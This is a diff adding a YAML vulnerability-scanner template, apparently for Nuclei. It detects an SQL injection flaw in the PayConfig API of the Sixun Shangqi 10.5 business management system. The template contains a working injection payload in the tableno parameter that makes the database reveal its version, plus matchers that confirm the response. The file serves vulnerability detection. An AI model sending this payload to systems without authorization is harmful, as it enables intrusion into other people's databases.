@@ -1,0 +1,31 @@
+id: sixun-payconfig-sqli
+info:
+  name: 思迅商旗10.5商业管理系统 PayConfig SQL注入漏洞(VEID-2026-11112)
+  author: leadlife
+  severity: high
+  description: 思迅商旗10.5商业管理系统 PayConfig SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。
+  reference: 
+    - https://mp.weixin.qq.com/s/LyBhwWB052s4JrrHLA4G-A
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: sixun,sqli
+
+http:
+  - raw:
+      - |
+        GET /api/Dinner/PayConfig?branchno&tableno=1'+or+1=@@VERSION--&uuid HTTP/1.1
+        Host: {{Hostname}}
+
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Microsoft SQL Server')
+        condition: and
